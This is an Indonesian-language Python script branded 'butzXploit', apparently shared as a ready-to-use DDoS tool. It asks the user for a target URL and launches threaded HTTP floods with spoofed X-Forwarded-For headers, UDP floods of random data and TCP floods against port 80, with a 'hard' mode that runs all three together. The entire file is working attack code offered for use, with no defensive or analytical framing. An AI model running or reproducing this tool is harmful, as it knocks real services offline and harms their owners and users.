#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# butzXploit DDoS Ganas All-in-One
import os, sys, threading, socket, random, time
from urllib.parse import urlparse

# WARNA
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'; W = '\033[97m'; N = '\033[0m'

# TAMPILAN
os.system('clear')
print(f"""{R}
██╗░░░██╗██╗░░██╗████████╗███████╗██╗░░░██╗██╗░░░░░░██████╗
██║░░░██║██║░░██║╚══██╔══╝██╔════╝██║░░░██║██║░░░░░██╔════╝
╚██╗░██╔╝███████║░░░██║░░░█████╗░░██║░░░██║██║░░░░░╚█████╗░
░╚████╔╝░██╔══██║░░░██║░░░██╔══╝░░██║░░░██║██║░░░░░░╚═══██╗
░░╚██╔╝░░██║░░██║░░░██║░░░███████╗╚██████╔╝███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚═════╝░╚══════╝╚═════╝
          {W}TOOLS DDoS GANAS BY {R}butzXploit{N}
""")

target = input(f"{Y}[>] Masukkan URL target (http/s): {W}")
mode = input(f"{Y}[>] Pilih Mode (easy/medium/hard): {W}").lower()
threads = int(input(f"{Y}[>] Jumlah Threads (100-1000): {W}"))

url = urlparse(target)
host = url.netloc or url.path
ip = socket.gethostbyname(host)

# === SERANGAN ===
def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 80))
            fake_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            payload = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: butzXploit\r\nX-Forwarded-For: {fake_ip}\r\nConnection: keep-alive\r\n\r\n"
            s.send(payload.encode())
            s.close()
        except:
            pass

def udp_flood():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (ip, 80))
        except:
            pass

def tcp_flood():
    data = random._urandom(2048)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 80))
            s.send(data)
            s.close()
        except:
            pass

print(f"{G}[✓] Target IP: {ip} | Mulai serangan...\n")

# MODE
def start_attack(mode):
    for i in range(threads):
        if mode == 'easy':
            threading.Thread(target=http_flood).start()
        elif mode == 'medium':
            threading.Thread(target=udp_flood).start()
        elif mode == 'hard':
            threading.Thread(target=http_flood).start()
            threading.Thread(target=udp_flood).start()
            threading.Thread(target=tcp_flood).start()
        else:
            print(f"{R}[!] Mode tidak dikenali!{N}")
            sys.exit()

start_attack(mode)
